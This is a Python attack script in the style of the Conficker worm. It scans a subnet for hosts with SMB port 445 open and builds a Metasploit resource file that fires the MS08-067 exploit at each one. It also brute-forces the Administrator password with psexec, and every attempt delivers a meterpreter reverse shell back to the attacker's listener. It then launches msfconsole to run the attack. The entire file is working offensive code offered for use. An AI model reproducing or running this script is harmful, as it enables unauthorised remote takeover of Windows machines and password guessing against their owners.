import os 
import optparse
import nmap

def findTrgs(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    trgHosts = []
    for host in nmScan.all_hosts():
        if 'tcp' in nmScan[host] and 445 in nmScan[host]['tcp']:
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found target host: ' + host)
                trgHosts.append(host)
    return trgHosts

def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + str(lhost) + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('set DisablePayloadHandler 1\n')

def confikerExploit(configFile, trgHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(trgHost) + '\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + str(lhost) + '\n')
    configFile.write('exploit -j -z\n')

def smbBrute(configFile, trgHost, passwdFile, lhost, lport):
    username = 'Administrator'
    with open(passwdFile, 'r') as pF:
        for password in pF.readlines():
            password = password.strip('\n').strip('\r')
            configFile.write('use exploit/windows/smb/psexec\n')
            configFile.write('set SMBUser ' + str(username) + '\n')
            configFile.write('set SMBPass ' + str(password) + '\n')
            configFile.write('set RHOST ' + str(trgHost) + '\n')
            configFile.write('set payload windows/meterpreter/reverse_tcp\n')
            configFile.write('set LPORT ' + str(lport) + '\n')
            configFile.write('set LHOST ' + str(lhost) + '\n')
            configFile.write('exploit -j -z\n')

def main():
    configFile = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <password File>]')
    parser.add_option('-H', dest='trgHost', type='string', help='Specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string', help='Specify the listening port')
    parser.add_option('-l', dest='lhost', type='string', help='Specify the listening host')
    parser.add_option('-F', dest='passwdFile', type='string', help='Specify the password file for SMB brute force attempt')
    (options, args) = parser.parse_args()

    if options.trgHost == None or options.lhost == None:
        print(parser.usage)
        exit(0)
    
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwdFile = options.passwdFile
    trgHosts = findTrgs(options.trgHost)
    setupHandler(configFile, lhost, lport)
    
    for trgHost in trgHosts:
        confikerExploit(configFile, trgHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile, trgHost, passwdFile, lhost, lport)
    
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
    main()
